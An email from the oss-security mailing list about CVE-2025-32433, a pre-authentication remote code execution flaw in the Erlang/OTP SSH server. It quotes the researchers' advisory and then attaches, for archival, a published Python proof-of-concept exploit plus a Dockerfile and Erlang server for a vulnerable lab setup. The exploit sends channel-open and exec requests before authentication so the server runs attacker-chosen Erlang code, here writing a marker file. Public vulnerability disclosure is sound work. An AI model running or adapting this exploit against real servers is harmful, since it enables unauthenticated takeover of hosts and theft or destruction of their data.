Received: (qmail 22079 invoked by uid 550); 18 Apr 2025 02:30:37 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 21780 invoked from network); 18 Apr 2025 02:30:29 -0000
Date: Fri, 18 Apr 2025 04:30:20 +0200
From: Solar Designer <solar@openwall.com>
To: Fabian =?utf-8?Q?B=C3=A4umer?= <fabian.baeumer@rub.de>
Cc: oss-security@lists.openwall.com, Matt Keeley <keeley55@me.com>
Message-ID: <20250418023020.GA13179@openwall.com>
References: <088f2e26-c56c-4045-a822-359d468cad2f@rub.de>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="1yeeQ81UyVL57Vl7"
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <088f2e26-c56c-4045-a822-359d468cad2f@rub.de>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] CVE-2025-32433: Unauthenticated Remote Code Execution in Erlang/OTP SSH

--1yeeQ81UyVL57Vl7
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit

On Wed, Apr 16, 2025 at 07:28:58PM +0200, Fabian Bäumer wrote:
> we (Fabian Bäumer, Marcus Brinkmann, Marcel Maehren, Jörg Schwenk (Ruhr 
> University Bochum)) found a critical security vulnerability in the 
> Erlang/OTP SSH implementation. The vulnerability allows an attacker with 
> network access to an Erlang/OTP SSH server to execute arbitrary code 
> without prior authentication. This vulnerability has been assigned 
> CVE-2025-32433 with an estimated CVSSv3 of 10.0 
> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H). The issue is caused by a 
> flaw in the SSH protocol message handling which allows an attacker to 
> send connection protocol messages prior to authentication.
> 
> ### Am I affected?
> 
> All users running an SSH server based on the Erlang/OTP SSH library are 
> likely to be affected by this vulnerability. If your application uses 
> Erlang/OTP SSH to provide remote access, assume you are affected.
> 
> ### Impact
> 
> The vulnerability allows an attacker to execute arbitrary code in the 
> context of the SSH daemon. If your SSH daemon is running as root, the 
> attacker has full access to your device. Consequently, this 
> vulnerability may lead to full compromise of hosts, allowing for 
> unauthorized access to and manipulation of sensitive data by third 
> parties, or denial-of-service attacks.
> 
> ### Mitigation
> 
> Users are advised to update to the latest available Erlang/OTP release. 
> Fixed versions are OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20. As a 
> temporary workaround, access to vulnerable SSH servers can be prevented 
> by suitable firewall rules.
> 
> ### Advisory
> 
> An official advisory is available on GitHub: 
> https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2

Matt Keeley (CC'ed) has just published an exploit at:

https://github.com/ProDefense/CVE-2025-32433

I'm also attaching the files to this message for archival.  These
correspond to the first and currently the only commit in the above repo,
commit hash 7936ef1cae51717e191328f3f571bf8a69370ce0.  I did not test
this, but at least it doesn't look obviously wrong to me.

I've also already seen an animated GIF of someone else's unreleased
exploit running (probably real), and a fake exploit for this bug on a
pastebin (doesn't look malicious, just fake).

Alexander

--1yeeQ81UyVL57Vl7
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="CVE-2025-32433.py"
Content-Transfer-Encoding: 8bit

import socket
import struct
import time

HOST = "127.0.0.1"  # Target IP (change if needed)
PORT = 2222  # Target port (change if needed)


# Helper to format SSH string (4-byte length + bytes)
def string_payload(s):
    s_bytes = s.encode("utf-8")
    return struct.pack(">I", len(s_bytes)) + s_bytes


# Builds SSH_MSG_CHANNEL_OPEN for session
def build_channel_open(channel_id=0):
    return (
        b"\x5a"  # SSH_MSG_CHANNEL_OPEN
        + string_payload("session")
        + struct.pack(">I", channel_id)  # sender channel ID
        + struct.pack(">I", 0x68000)  # initial window size
        + struct.pack(">I", 0x10000)  # max packet size
    )


# Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload
def build_channel_request(channel_id=0, command=None):
    if command is None:
        command = 'file:write_file("/lab.txt", <<"pwned">>).'
    return (
        b"\x62"  # SSH_MSG_CHANNEL_REQUEST
        + struct.pack(">I", channel_id)
        + string_payload("exec")
        + b"\x01"  # want_reply = true
        + string_payload(command)
    )


# Builds a minimal but valid SSH_MSG_KEXINIT packet
def build_kexinit():
    cookie = b"\x00" * 16

    def name_list(l):
        return string_payload(",".join(l))

    # Match server-supported algorithms from the log
    return (
        b"\x14"
        + cookie
        + name_list(
            [
                "curve25519-sha256",
                "ecdh-sha2-nistp256",
                "diffie-hellman-group-exchange-sha256",
                "diffie-hellman-group14-sha256",
            ]
        )  # kex algorithms
        + name_list(["rsa-sha2-256", "rsa-sha2-512"])  # host key algorithms
        + name_list(["aes128-ctr"]) * 2  # encryption client->server, server->client
        + name_list(["hmac-sha1"]) * 2  # MAC algorithms
        + name_list(["none"]) * 2  # compression
        + name_list([]) * 2  # languages
        + b"\x00"
        + struct.pack(">I", 0)  # first_kex_packet_follows, reserved
    )


# Pads a packet to match SSH framing
def pad_packet(payload, block_size=8):
    min_padding = 4
    padding_len = block_size - ((len(payload) + 5) % block_size)
    if padding_len < min_padding:
        padding_len += block_size
    return (
        struct.pack(">I", len(payload) + 1 + padding_len)
        + bytes([padding_len])
        + payload
        + bytes([0] * padding_len)
    )


# === Exploit flow ===
try:
    with socket.create_connection((HOST, PORT), timeout=5) as s:
        print("[*] Connecting to SSH server...")

        # 1. Banner exchange
        s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
        banner = s.recv(1024)
        print(f"[+] Received banner: {banner.strip().decode(errors='ignore')}")
        time.sleep(0.5)  # Small delay between packets

        # 2. Send SSH_MSG_KEXINIT
        print("[*] Sending SSH_MSG_KEXINIT...")
        kex_packet = build_kexinit()
        s.sendall(pad_packet(kex_packet))
        time.sleep(0.5)  # Small delay between packets

        # 3. Send SSH_MSG_CHANNEL_OPEN
        print("[*] Sending SSH_MSG_CHANNEL_OPEN...")
        chan_open = build_channel_open()
        s.sendall(pad_packet(chan_open))
        time.sleep(0.5)  # Small delay between packets

        # 4. Send SSH_MSG_CHANNEL_REQUEST (pre-auth!)
        print("[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...")
        chan_req = build_channel_request(
            command='file:write_file("/lab.txt", <<"pwned">>).'
        )
        s.sendall(pad_packet(chan_req))

        print(
            "[✓] Exploit sent! If the server is vulnerable, it should have written to /lab.txt."
        )

        # Try to receive any response (might get a protocol error or disconnect)
        try:
            response = s.recv(1024)
            print(f"[+] Received response: {response.hex()}")
        except socket.timeout:
            print("[*] No response within timeout period (which is expected)")

except Exception as e:
    print(f"[!] Error: {e}")

--1yeeQ81UyVL57Vl7
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename=Dockerfile

FROM debian:bookworm

WORKDIR /build

RUN apt-get update && apt-get install -y \
  git build-essential libssl-dev autoconf libncurses5-dev \
  libgl1-mesa-dev libglu1-mesa-dev libpng-dev \
  libssh-dev libxml2-utils xsltproc fop wget curl \
  openssh-client

# Clone and build Erlang/OTP 26.2.5.11
RUN git clone https://github.com/erlang/otp.git && \
    cd otp && \
    git checkout OTP-26.2.5.10 && \
    ./configure --prefix=/usr && \
    make -j$(nproc) && \
    make install

WORKDIR /root

COPY ssh_server.erl .
RUN erlc ssh_server.erl

# Generate RSA key in PEM format that Erlang understands
RUN mkdir -p /root/ssh_keys && \
    ssh-keygen -m PEM -t rsa -b 2048 -f /root/ssh_keys/ssh_host_rsa_key -N "" && \
    ssh-keygen -y -f /root/ssh_keys/ssh_host_rsa_key > /root/ssh_keys/ssh_host_rsa_key.pub

EXPOSE 2222

CMD ["erl", "-noshell", "-pa", ".", "-s", "ssh_server", "start"]

--1yeeQ81UyVL57Vl7
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="ssh_server.erl"

-module(ssh_server).
-export([start/0]).

start() ->
    io:format("Starting vulnerable SSH server~n"),
    application:ensure_all_started(ssh),
    case ssh:daemon(2222, [
        {system_dir, "/root/ssh_keys"},
        {auth_methods, "password"},
        {pwdfun, fun(User, Pass) ->
            io:format("Login attempt ~p/~p~n", [User, Pass]),
            true
        end}
    ]) of
        {ok, Pid} ->
            io:format("SSH Daemon started successfully. Pid: ~p~n", [Pid]);
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end.

--1yeeQ81UyVL57Vl7--
